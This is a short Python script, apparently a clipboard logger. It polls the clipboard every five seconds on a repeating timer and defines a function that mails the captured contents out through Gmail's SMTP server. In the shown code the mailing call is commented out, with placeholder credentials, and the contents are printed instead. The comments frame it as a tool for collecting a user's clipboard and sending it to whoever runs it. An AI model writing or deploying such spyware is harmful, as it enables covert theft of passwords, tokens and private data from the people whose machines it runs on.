import pyperclip

# Used to send emails every certain amount of time of the log
import smtplib
# Threading Library
import threading

# create a log variable
log = ""

# Sends us the email of the log on the given interval
def send_email(email, password, message):
    # Initialize server for gmail
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    # Start server
    email_server.starttls()
    # Login for me
    email_server.login(email, password)
    # Send the log to yourself
    email_server.sendmail(email, email, message)
    # Quit
    email_server.quit()

# We need to THREAD to send emails and retrieve info at the same time.
def thread_function():
    global log
    log = pyperclip.paste()
    #send_email("emailaddress@gmail.com", "yourpassword", log)
    print(log)
    # Clear the log after sending it
    log = ""
    # Timer(interval, function)
    timer_object = threading.Timer(5, thread_function)
    timer_object.start()

thread_function()
